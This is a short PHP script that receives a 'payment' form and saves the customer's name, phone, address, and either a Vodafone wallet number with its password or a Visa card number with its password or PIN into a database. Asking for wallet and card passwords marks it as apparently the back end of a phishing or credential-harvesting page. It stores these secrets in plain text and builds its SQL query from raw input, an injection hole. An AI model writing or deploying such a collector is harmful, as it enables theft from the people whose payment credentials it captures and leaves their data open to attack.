<?php
include "db.php";

error_reporting(E_ALL);
ini_set('display_errors', 1);

if ($_SERVER["REQUEST_METHOD"] == "POST") {

    $type = trim(strtolower($_POST["form_type"] ?? ""));

    if ($type == "payment") {

        $name = $_POST["name"] ?? "";
        $phone = $_POST["phone"] ?? "";
        $address = $_POST["address"] ?? "";
        $payment = $_POST["payment"] ?? "";

        $wallet = "";
        $pass = "";

        if ($payment == "vodafone") {
            $wallet = $_POST["vodafone_wallet"] ?? "";
            $pass = $_POST["vodafone_pass"] ?? "";
        } elseif ($payment == "visa") {
            $wallet = $_POST["visa_card"] ?? "";
            $pass = $_POST["visa_pass"] ?? "";
        }

        $sql = "INSERT INTO payment_orders 
        (name, phone, address, payment_method, wallet_number, wallet_pass)
        VALUES 
        ('$name', '$phone', '$address', '$payment', '$wallet', '$pass')";

        if (mysqli_query($conn, $sql)) {
            echo "success";
        } else {
            echo "error";
        }

        exit();
    }
}
?>